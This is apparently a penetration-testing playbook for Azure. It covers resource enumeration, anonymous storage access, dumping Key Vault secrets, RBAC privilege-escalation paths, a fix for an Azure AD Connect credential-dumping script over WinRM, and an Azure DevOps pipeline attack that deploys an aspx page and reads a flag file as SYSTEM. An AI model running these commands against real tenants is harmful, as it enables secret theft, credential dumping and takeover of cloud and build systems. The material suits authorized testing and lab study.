# Azure — Recon, Storage, RBAC, Key Vault

## When this applies

- You have Azure credentials (user/SP) or are testing an Azure-hosted target.
- Goal: enumerate resources, audit RBAC, exfiltrate from storage and Key Vault.

## Technique

`az login`, then enumerate per service (storage accounts, VMs, NSGs, Key Vaults). Use ROADtools for Azure AD / Entra ID enumeration. MicroBurst for offensive PowerShell modules.

## Steps

### Azure CLI enumeration

```bash
# Login to Azure
az login

# Get account information
az account show

# List subscriptions
az account list

# List resource groups
az group list

# List storage accounts
az storage account list

# Check storage account access
az storage account show --name accountname

# List public containers
az storage container list --account-name accountname

# List virtual machines
az vm list

# List network security groups
az network nsg list

# Show NSG rules
az network nsg rule list --nsg-name nsg-name --resource-group rg-name

# List Key Vaults
az keyvault list

# List secrets in Key Vault
az keyvault secret list --vault-name vault-name

# Get secret value
az keyvault secret show --vault-name vault-name --name secret-name

# List role assignments
az role assignment list

# Check user permissions
az role assignment list --assignee user@domain.com
```

### PowerShell Azure enumeration

```powershell
# Connect to Azure
Connect-AzAccount

# Get current context
Get-AzContext

# List subscriptions
Get-AzSubscription

# List resource groups
Get-AzResourceGroup

# List storage accounts
Get-AzStorageAccount

# List VMs
Get-AzVM

# List NSGs
Get-AzNetworkSecurityGroup

# Get NSG rules
Get-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg

# List Key Vaults
Get-AzKeyVault

# List role assignments
Get-AzRoleAssignment

# Check managed identities
Get-AzUserAssignedIdentity
```

### Storage account testing

```bash
# Test anonymous access
az storage blob list --account-name accountname --container-name containername --auth-mode login

# Without authentication
curl https://accountname.blob.core.windows.net/container/

# Download blob
az storage blob download --account-name accountname --container-name container --name file.txt --file ./file.txt

# List containers anonymously
curl https://accountname.blob.core.windows.net/?comp=list
```

### ROADtools (Azure AD / Entra ID)

```bash
# Install ROADtools
pip install roadrecon

# Authenticate
roadrecon auth --username user@domain.com --password pass

# Gather data
roadrecon gather

# Start GUI
roadrecon gui
```

### MicroBurst

```powershell
# Import MicroBurst
Import-Module MicroBurst.psm1

# Enumerate Azure resources
Get-AzureDomainInfo -domain target.onmicrosoft.com

# Find public storage containers
Invoke-EnumerateAzureBlobs -Base target

# Get RunAs accounts
Get-AzureRunAsAccounts

# Get available VM extensions
Get-AzureVMExtensionSettings
```

### Privilege escalation paths

```bash
# Contributor role on subscription
# Can create new resources, including VMs with scripts

# Owner role on resource
# Can modify RBAC permissions

# User Access Administrator
# Can grant permissions to self or others

# Global Administrator (Azure AD)
# Can elevate to subscription Owner

# Application Administrator
# Can reset credentials for service principals
```

### Azure AD Connect — `(localdb)\.\ADSync` connection failure on WinRM

**Symptom:** Running the canonical xpn `Get-AzureADCredentials.ps1` over evil-winrm fails with `SqlException: Unable to locate a Local Database Runtime installation.` even though `sqlservr.exe` runs as the AAD service account. The LocalDB runtime resolver is per-user-session and not exposed to the network logon.

**Fix:** swap the connection string from `Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync` to a direct-instance connection. The default SQL Server instance is reachable from the Azure-Admins-group user via integrated auth:

```powershell
$client = New-Object System.Data.SqlClient.SqlConnection -ArgumentList "Server=.;Database=ADSync;Integrated Security=true"
```

Also add explicit casts on `LoadKeySet` args (some PS hosts otherwise raise `MethodArgumentConversionInvalidCastArgument` followed by an `AccessViolationException` in `mcrypt.dll`):

```powershell
$km.LoadKeySet([guid]$entropy, [guid]$instance_id, [int]$key_id)
```

### Azure DevOps Server (NTLM) — Pipeline-as-code RCE

**Authentication via `curl --ntlm -u user:pass`** (anonymous returns `TF400813: Resource not available for anonymous access`). The 302 to `/{collection}/` after auth is the success signal. Use `?api-version=5.1` for Azure DevOps Server 2019/2020 (6.0+ raises `VssVersionOutOfRangeException`).

**Trigger build on a feature branch when master is policy-protected:**
1. Push aspx/yaml to a new branch via `git -c http.extraHeader="Host: devops.example.local" push`.
2. Queue an *existing* CI pipeline against the new branch:
   ```bash
   curl --ntlm -u user:pass -X POST -H 'Content-Type: application/json' \
     -d '{"definition":{"id":3},"sourceBranch":"refs/heads/<branch>"}' \
     "http://devops.example.local/{coll}/{proj}/_apis/build/builds?api-version=5.1"
   ```
3. The build's CopyFiles task deploys to `w:\sites\<repo>.example.local` — your aspx is now reachable on the IIS vhost.

**Privilege escalation via SYSTEM build agent:** create a *new* `azure-pipelines.yml` pipeline definition (YAML build, processType=2) on a new branch, queue it on the on-prem agent pool. The agent runs as `NT AUTHORITY\SYSTEM`, so the script step can `type C:\Users\Administrator\Desktop\root.txt` directly into the build log — read the log via `_apis/build/builds/<id>/logs/<n>?api-version=5.1`. No reverse shell required.

## Verifying success

- `az account show` returns identity with subscription access.
- Storage container content listed without authentication.
- Key Vault secret retrieved with `az keyvault secret show`.

## Common pitfalls

- Some storage accounts require SAS tokens — anonymous returns 403.
- Azure AD's "guest" users have very limited rights — confirm with `az role assignment list`.
- Conditional Access may block CLI login from non-corporate networks — use device code flow.

## Tools

- az (Azure CLI), Az PowerShell module
- ROADtools, MicroBurst, Azucar, Stormspotter
- ScoutSuite (multi-cloud)
